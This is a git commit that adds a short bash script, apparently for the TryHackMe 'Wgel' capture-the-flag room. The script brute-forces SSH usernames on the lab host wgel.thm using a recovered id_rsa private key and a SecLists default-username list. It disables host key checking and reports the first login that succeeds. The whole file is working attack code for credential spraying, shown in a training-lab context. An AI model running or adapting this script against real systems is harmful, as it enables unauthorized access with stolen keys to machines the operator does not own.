dc39959f403f0b5af724d59766b7d1a322a63223
mr_j3r03n <r03n3h@gmail.com>
2024-01-23 15:19:20 -0500

    Create wgel-thm.sh
    Tried a brute-force after found a id_rsa private key.

---
+++ wgel-thm.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+
+ssh_host="wgel.thm"
+ssh_port=22
+private_key_path="id_rsa"
+
+#userlist="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
+userlist="/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt"
+
+function try_ssh {
+    username=$1
+    if ssh -i "$private_key_path" -o BatchMode=yes -o StrictHostKeyChecking=no -p "$ssh_port" "$username@$ssh_host" 'echo success' 2>&1 | grep -q 'success'; then
+        echo "[+] Succes! Username: $username"
+        exit 0
+    else
+        echo "[-] Failed : $username"
+    fi
+}
+
+while IFS= read -r username; do
+    try_ssh "$username"
+done < "$userlist"
